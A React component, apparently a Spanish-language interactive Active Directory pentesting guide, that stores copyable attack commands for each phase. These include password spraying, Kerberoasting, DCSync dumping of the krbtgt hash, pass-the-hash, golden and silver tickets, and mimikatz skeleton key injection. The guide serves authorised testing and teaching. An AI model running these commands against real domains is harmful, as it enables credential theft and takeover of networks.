import React, { useState } from 'react';
import './ADPentestGuide.css';

const ADPentestGuide = () => {
  const [activePhase, setActivePhase] = useState('reconnaissance');
  const [expandedTechniques, setExpandedTechniques] = useState({});
  const [expandedTools, setExpandedTools] = useState({});

  const toggleTechnique = (techniqueId) => {
    setExpandedTechniques(prev => ({
      ...prev,
      [techniqueId]: !prev[techniqueId]
    }));
  };
  
  const toggleTool = (e, tool, techniqueId) => {
    e.stopPropagation(); // Evita que se cierre la técnica al hacer clic en la herramienta
    
    // Generar un ID único para la combinación de herramienta y técnica
    const toolId = `${techniqueId}-${tool}`;
    
    // Alternar el estado de la herramienta expandida
    setExpandedTools(prev => ({
      ...prev,
      [toolId]: !prev[toolId]
    }));
  };

  // Información de las herramientas
  const toolsInfo = {
    "BloodHound": {
      description: "Herramienta de análisis de Active Directory que mapea relaciones de confianza y paths de ataque.",
      website: "https://github.com/BloodHoundAD/BloodHound",
      commands: [
        "Invoke-BloodHound -CollectionMethod All",
        "Invoke-BloodHound -CollectionMethod DCOnly"
      ],
      notes: "Requiere Neo4j para visualizar los datos. Muy potente para identificar rutas de escalada de privilegios."
    },
    "PowerView": {
      description: "Colección de funciones PowerShell para reconocimiento y enumeración de AD.",
      website: "https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon",
      commands: [
        "Get-Domain",
        "Get-DomainUser",
        "Get-DomainGroup",
        "Find-LocalAdminAccess",
        "Get-DomainTrust"
      ],
      notes: "Parte de PowerSploit. Muy útil para la fase de reconocimiento inicial."
    },
    "ADExplorer": {
      description: "Herramienta de Microsoft Sysinternals para explorar Active Directory.",
      website: "https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer",
      commands: [],
      notes: "Herramienta gráfica. Permite guardar snapshots de AD para análisis offline."
    },
    "mimikatz": {
      description: "Herramienta avanzada para extraer credenciales, hashes, tickets y crear Golden/Silver tickets.",
      website: "https://github.com/gentilkiwi/mimikatz",
      commands: [
        "privilege::debug",
        "sekurlsa::logonpasswords",
        "kerberos::golden",
        "lsadump::dcsync"
      ],
      notes: "Extremadamente potente. Detectada por la mayoría de soluciones EDR/AV."
    },
    "Rubeus": {
      description: "Herramienta en C# para interactuar con Kerberos en Windows.",
      website: "https://github.com/GhostPack/Rubeus",
      commands: [
        "Rubeus.exe kerberoast",
        "Rubeus.exe asreproast",
        "Rubeus.exe dump",
        "Rubeus.exe ptt /ticket:base64ticket"
      ],
      notes: "Parte de GhostPack. Alternativa moderna a mimikatz para ataques basados en Kerberos."
    },
    "Impacket": {
      description: "Colección de scripts Python para trabajar con protocolos de red.",
      website: "https://github.com/SecureAuthCorp/impacket",
      commands: [
        "GetUserSPNs.py -request -dc-ip <DC-IP> <DOMAIN>/<USER>",
        "secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>",
        "psexec.py -hashes :<HASH> <DOMAIN>/<USER>@<TARGET>"
      ],
      notes: "Muy útil para ataques remotos desde sistemas Linux contra dominios Windows."
    },
    "CrackMapExec": {
      description: "Suite de post-explotación para redes Windows/Active Directory.",
      website: "https://github.com/byt3bl33d3r/CrackMapExec",
      commands: [
        "crackmapexec smb <TARGET> -u <USER> -p <PASSWORD>",
        "crackmapexec smb <TARGET> -u <USER> -H <HASH>",
        "crackmapexec smb <TARGET> -u <USER> -p <PASSWORD> --sam"
      ],
      notes: "Excelente para movimiento lateral y enumeración en redes grandes."
    },
    "Get-GPPPassword": {
      description: "Script PowerShell para extraer y descifrar contraseñas almacenadas en Group Policy Preferences.",
      website: "https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1",
      commands: [
        "Get-GPPPassword"
      ],
      notes: "Parte de PowerSploit. Útil para encontrar contraseñas legadas en SYSVOL."
    },
    "PowerSploit": {
      description: "Framework de post-explotación en PowerShell con múltiples módulos.",
      website: "https://github.com/PowerShellMafia/PowerSploit",
      commands: [
        "Import-Module PowerSploit",
        "Get-Command -Module PowerSploit"
      ],
      notes: "Incluye PowerView, PowerUp y otros módulos útiles para pentesting de AD."
    },
    "net.exe": {
      description: "Herramienta nativa de Windows para administración de red y dominio.",
      website: "",
      commands: [
        "net user /domain",
        "net group /domain",
        "net group \"Domain Admins\" /domain",
        "net localgroup Administrators"
      ],
      notes: "Herramienta nativa, puede pasar desapercibida en logs de seguridad."
    },
    "nmap": {
      description: "Escáner de red y herramienta de descubrimiento de hosts.",
      website: "https://nmap.org/",
      commands: [
        "nmap -sV -p 389,636,3268,3269 <IP_Rango>",
        "nmap -p- --open <TARGET>",
        "nmap -sC -sV -p 445 <TARGET>"
      ],
      notes: "Útil para la fase inicial de descubrimiento y enumeración de servicios."
    },
    "Spray365": {
      description: "Herramienta para realizar ataques de password spraying contra Microsoft 365.",
      website: "https://github.com/MarkoH17/Spray365",
      commands: [
        "python spray365.py -u users.txt -p 'Password123!' -d domain.com"
      ],
      notes: "Útil para probar acceso a entornos híbridos de Azure AD."
    }
  };

  const renderToolInfo = (tool, techniqueId) => {
    const toolId = `${techniqueId}-${tool}`;
    const isExpanded = expandedTools[toolId];
    
    if (!isExpanded) return null;
    
    const info = toolsInfo[tool] || {
      description: "Herramienta utilizada en ataques de pentesting de Active Directory.",
      website: "",
      commands: [],
      notes: "No hay información detallada disponible para esta herramienta."
    };
    
    return (
      <div className="tool-info">
        <div className="tool-info-content">
          <p className="tool-description">{info.description}</p>
          
          {info.website && (
                          <div className="tool-website">
                <h5>Sitio web:</h5>
                <a href={info.website} target="_blank" rel="noopener noreferrer" title={info.website}>
                  {info.website.length > 40 ? info.website.substring(0, 40) + '...' : info.website}
                </a>
              </div>
          )}
          
          {info.commands && info.commands.length > 0 && (
            <div className="tool-commands">
              <h5>Comandos comunes:</h5>
              <ul>
                {info.commands.map((cmd, idx) => (
                  <li key={idx}>
                    <code>{cmd}</code>
                    <button 
                      className="copy-button" 
                      onClick={(e) => {
                        e.stopPropagation();
                        navigator.clipboard.writeText(cmd);
                        alert("Comando copiado al portapapeles");
                      }}
                    >
                      Copiar
                    </button>
                  </li>
                ))}
              </ul>
            </div>
          )}
          
          {info.notes && (
            <div className="tool-notes">
              <h5>Notas:</h5>
              <p>{info.notes}</p>
            </div>
          )}
        </div>
      </div>
    );
  };

  const phases = {
    reconnaissance: {
      title: "Reconocimiento",
      description: "Recopilación de información sobre el entorno AD",
      techniques: [
        {
          id: "recon-1",
          name: "Enumeración de dominio",
          description: "Recopila información básica sobre el dominio AD",
          tools: ["BloodHound", "ADExplorer", "PowerView"],
          commands: [
            { 
              tool: "PowerView", 
              cmd: "Get-Domain", 
              description: "Obtiene información básica del dominio"
            },
            { 
              tool: "BloodHound", 
              cmd: "Invoke-BloodHound -CollectionMethod All", 
              description: "Recopila todos los datos disponibles del dominio"
            }
          ],
          resources: ["https://attack.mitre.org/techniques/T1018/"]
        },
        {
          id: "recon-2",
          name: "Enumeración de usuarios y grupos",
          description: "Identifica usuarios y grupos en el dominio",
          tools: ["net.exe", "PowerView", "ADExplorer"],
          commands: [
            { 
              tool: "PowerView", 
              cmd: "Get-DomainUser", 
              description: "Lista todos los usuarios del dominio" 
            },
            { 
              tool: "PowerView", 
              cmd: "Get-DomainGroup", 
              description: "Lista todos los grupos del dominio" 
            },
            { 
              tool: "net.exe", 
              cmd: "net user /domain", 
              description: "Lista usuarios del dominio (método nativo)" 
            }
          ],
          resources: ["https://attack.mitre.org/techniques/T1087/"]
        },
        {
          id: "recon-3",
          name: "Enumeración de hosts",
          description: "Identifica equipos en la red",
          tools: ["nmap", "PowerView", "ADExplorer"],
          commands: [
            { 
              tool: "PowerView", 
              cmd: "Get-DomainComputer", 
              description: "Lista todas las máquinas del dominio" 
            },
            { 
              tool: "nmap", 
              cmd: "nmap -sV -p 389,636,3268,3269 <IP_Rango>", 
              description: "Busca controladores de dominio" 
            }
          ],
          resources: ["https://attack.mitre.org/techniques/T1018/"]
        }
      ]
    },
    initialAccess: {
      title: "Acceso Inicial",
      description: "Técnicas para obtener el primer acceso al entorno",
      techniques: [
        {
          id: "access-1",
          name: "Password Spraying",
          description: "Probar contraseñas comunes contra múltiples cuentas",
          tools: ["Rubeus", "CrackMapExec", "Spray365"],
          commands: [
            { 
              tool: "CrackMapExec", 
              cmd: "crackmapexec smb <DC-IP> -u users.txt -p 'Password123!'", 
              description: "Prueba una contraseña en lista de usuarios" 
            },
            { 
              tool: "Rubeus", 
              cmd: "Rubeus.exe brute /password:Password123 /noticket", 
              description: "Ataque de password spray con Rubeus" 
            }
          ],
          resources: ["https://attack.mitre.org/techniques/T1110/003/"]
        },
        {
          id: "access-2",
          name: "Kerberoasting",
          description: "Solicitar tickets TGS para cuentas de servicio y crackearlos offline",
          tools: ["Rubeus", "Impacket", "mimikatz"],
          commands: [
            { 
              tool: "Rubeus", 
              cmd: "Rubeus.exe kerberoast /outfile:hashes.txt", 
              description: "Extrae tickets y guarda hashes" 
            },
            { 
              tool: "Impacket", 
              cmd: "GetUserSPNs.py -request -dc-ip <DC-IP> <DOMAIN>/<USER>", 
              description: "Extrae tickets con Impacket" 
            }
          ],
          resources: ["https://attack.mitre.org/techniques/T1558/003/"]
        },
        {
          id: "access-3",
          name: "AS-REP Roasting",
          description: "Obtener AS-REP hashes para cuentas sin preautenticación Kerberos",
          tools: ["Rubeus", "Impacket"],
          commands: [
            { 
              tool: "Rubeus", 
              cmd: "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt", 
              description: "Extrae hashes AS-REP con Rubeus" 
            },
            { 
              tool: "Impacket", 
              cmd: "GetNPUsers.py -dc-ip <DC-IP> <DOMAIN>/ -usersfile users.txt -format hashcat", 
              description: "Extrae hashes AS-REP con Impacket" 
            }
          ],
          resources: ["https://attack.mitre.org/techniques/T1558/004/"]
        }
      ]
    },
    privilegeEscalation: {
      title: "Escalada de Privilegios",
      description: "Técnicas para aumentar privilegios dentro del dominio",
      techniques: [
        {
          id: "priv-1",
          name: "Abuso de GPP/cPasswords",
          description: "Búsqueda de contraseñas en Group Policy Preferences",
          tools: ["Get-GPPPassword", "PowerSploit"],
          commands: [
            { 
              tool: "PowerSploit", 
              cmd: "Get-GPPPassword", 
              description: "Busca y descifra contraseñas en GPP" 
            }
          ],
          resources: ["https://attack.mitre.org/techniques/T1552/006/"]
        },
        {
          id: "priv-2",
          name: "Abuso de Delegación Kerberos",
          description: "Explotar configuraciones inseguras de delegación",
          tools: ["Rubeus", "mimikatz"],
          commands: [
            { 
              tool: "Rubeus", 
              cmd: "Rubeus.exe s4u /user:COMPUTER$ /rc4:<HASH> /impersonateuser:Administrator /msdsspn:CIFS/target.domain.com /altservice:LDAP /ptt", 
              description: "Abuso de Resource-Based Constrained Delegation" 
            }
          ],
          resources: ["https://attack.mitre.org/techniques/T1558/001/"]
        },
        {
          id: "priv-3",
          name: "DCSync",
          description: "Abusar de permisos de replicación para sincronizar hashes de contraseñas",
          tools: ["mimikatz", "Impacket"],
          commands: [
            { 
              tool: "mimikatz", 
              cmd: "lsadump::dcsync /domain:<DOMAIN> /user:krbtgt", 
              description: "Obtiene hash del usuario krbtgt mediante DCSync" 
            },
            { 
              tool: "Impacket", 
              cmd: "secretsdump.py -just-dc <DOMAIN>/<USER>:<PASSWORD>@<DC-IP>", 
              description: "DCSync usando Impacket" 
            }
          ],
          resources: ["https://attack.mitre.org/techniques/T1003/006/"]
        }
      ]
    },
    lateralMovement: {
      title: "Movimiento Lateral",
      description: "Técnicas para moverse entre sistemas dentro del dominio",
      techniques: [
        {
          id: "lateral-1",
          name: "Pass-the-Hash",
          description: "Utilizar hashes NTLM sin necesidad de crackearlos",
          tools: ["CrackMapExec", "Impacket", "mimikatz"],
          commands: [
            { 
              tool: "CrackMapExec", 
              cmd: "crackmapexec smb <TARGET-IP> -u <USERNAME> -H <HASH>", 
              description: "Acceso usando hash NTLM" 
            },
            { 
              tool: "Impacket", 
              cmd: "psexec.py -hashes :<HASH> <DOMAIN>/<USER>@<TARGET>", 
              description: "Obtener shell con hash NTLM" 
            }
          ],
          resources: ["https://attack.mitre.org/techniques/T1550/002/"]
        },
        {
          id: "lateral-2",
          name: "Pass-the-Ticket",
          description: "Reutilizar tickets Kerberos para autenticación",
          tools: ["Rubeus", "mimikatz"],
          commands: [
            { 
              tool: "Rubeus", 
              cmd: "Rubeus.exe dump /nowrap", 
              description: "Extrae tickets de memoria" 
            },
            { 
              tool: "Rubeus", 
              cmd: "Rubeus.exe ptt /ticket:<BASE64-TICKET>", 
              description: "Inyecta un ticket en la sesión actual" 
            }
          ],
          resources: ["https://attack.mitre.org/techniques/T1550/003/"]
        },
        {
          id: "lateral-3",
          name: "Overpass-the-Hash",
          description: "Convertir hash NTLM a ticket Kerberos",
          tools: ["Rubeus", "mimikatz"],
          commands: [
            { 
              tool: "Rubeus", 
              cmd: "Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /ptt", 
              description: "Solicita TGT con hash NTLM e inyecta en sesión" 
            }
          ],
          resources: ["https://attack.mitre.org/techniques/T1558/"]
        }
      ]
    },
    domainDomination: {
      title: "Persistencia",
      description: "Técnicas para mantener control persistente del dominio",
      techniques: [
        {
          id: "domain-1",
          name: "Golden Ticket",
          description: "Crear tickets falsos con la clave del krbtgt",
          tools: ["mimikatz", "Rubeus"],
          commands: [
            { 
              tool: "mimikatz", 
              cmd: "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN-SID> /krbtgt:<KRBTGT-HASH> /ptt", 
              description: "Crea e inyecta Golden Ticket" 
            },
            { 
              tool: "Rubeus", 
              cmd: "Rubeus.exe golden /aes256:<AES256-KEY> /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN-SID> /ptt", 
              description: "Crea e inyecta Golden Ticket con clave AES256" 
            }
          ],
          resources: ["https://attack.mitre.org/techniques/T1558/001/"]
        },
        {
          id: "domain-2",
          name: "Silver Ticket",
          description: "Crear tickets de servicio falsos",
          tools: ["mimikatz", "Rubeus"],
          commands: [
            { 
              tool: "mimikatz", 
              cmd: "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN-SID> /target:<SERVER> /service:CIFS /rc4:<SERVICE-ACCOUNT-HASH> /ptt", 
              description: "Crea e inyecta Silver Ticket para servicio CIFS" 
            }
          ],
          resources: ["https://attack.mitre.org/techniques/T1558/001/"]
        },
        {
          id: "domain-3",
          name: "Skeleton Key",
          description: "Inyectar una contraseña maestra en el controlador de dominio",
          tools: ["mimikatz"],
          commands: [
            { 
              tool: "mimikatz", 
              cmd: "privilege::debug\nmisc::skeleton", 
              description: "Inyecta Skeleton Key (contraseña: mimikatz)" 
            }
          ],
          resources: ["https://attack.mitre.org/techniques/T1556/001/"]
        }
      ]
    }
  };

  const renderTechnique = (technique) => {
    const isExpanded = expandedTechniques[technique.id];
    
    return (
      <div 
        key={technique.id} 
        className="technique"
        onClick={() => toggleTechnique(technique.id)}
      >
        <div className="technique-header">
          <h3 className="technique-title">{technique.name}</h3>
          <span>{isExpanded ? '−' : '+'}</span>
        </div>
        
        <p className="technique-description">{technique.description}</p>
        
        {isExpanded && (
          <div className="technique-content" onClick={(e) => e.stopPropagation()}>
            <div className="tools-section">
              <h4 className="section-title tools-title">Herramientas:</h4>
              <div className="tools-container">
                {technique.tools.map(tool => {
                  const toolId = `${technique.id}-${tool}`;
                  const isToolExpanded = expandedTools[toolId];
                  
                  return (
                    <div key={tool} className="tool-wrapper">
                      <span 
                        className={`tool-tag ${isToolExpanded ? 'active' : ''}`}
                        onClick={(e) => toggleTool(e, tool, technique.id)}
                      >
                        {tool} {isToolExpanded ? '−' : '+'}
                      </span>
                      {isToolExpanded && renderToolInfo(tool, technique.id)}
                    </div>
                  );
                })}
              </div>
            </div>
            
            <div className="commands-section">
              <h4 className="section-title commands-title">Comandos:</h4>
              {technique.commands.map((cmd, idx) => (
                <div key={idx} className="command-container">
                  <div className="command-tool">{cmd.tool}:</div>
                  <code className="command-code">
                    {cmd.cmd}
                  </code>
                  <div className="command-description">{cmd.description}</div>
                </div>
              ))}
            </div>
            
            <div className="resources-section">
              <h4 className="section-title resources-title">Recursos:</h4>
              <ul className="resource-list">
                {technique.resources.map((resource, idx) => (
                  <li key={idx}>
                    <a 
                      href={resource} 
                      target="_blank" 
                      rel="noopener noreferrer"
                      className="resource-link"
                    >
                      {resource}
                    </a>
                  </li>
                ))}
              </ul>
            </div>
          </div>
        )}
      </div>
    );
  };

  return (
    <div className="pentest-guide">
      <header className="guide-header">
        <h1 className="guide-title">IlaNami AD Guide - Guía Interactiva de Pentesting para Active Directory</h1>
        <p className="guide-subtitle">Basada en el mind map de Orange Cyberdefense</p>
      </header>
      
      <div className="phase-buttons">
        {Object.keys(phases).map(phaseKey => (
          <button
            key={phaseKey}
            onClick={() => setActivePhase(phaseKey)}
            className={`phase-button ${activePhase === phaseKey ? 'active' : ''}`}
          >
            {phases[phaseKey].title}
          </button>
        ))}
      </div>
      
      <div className="phase-content">
        <h2 className="phase-title">{phases[activePhase].title}</h2>
        <p className="phase-description">{phases[activePhase].description}</p>
        
        <div className="techniques-container">
          {phases[activePhase].techniques.map(technique => renderTechnique(technique))}
        </div>
      </div>
      
      <footer className="guide-footer">
        <p>Esta guía es solo para fines educativos y pruebas autorizadas.</p>
      </footer>
    </div>
  );
};

export default ADPentestGuide;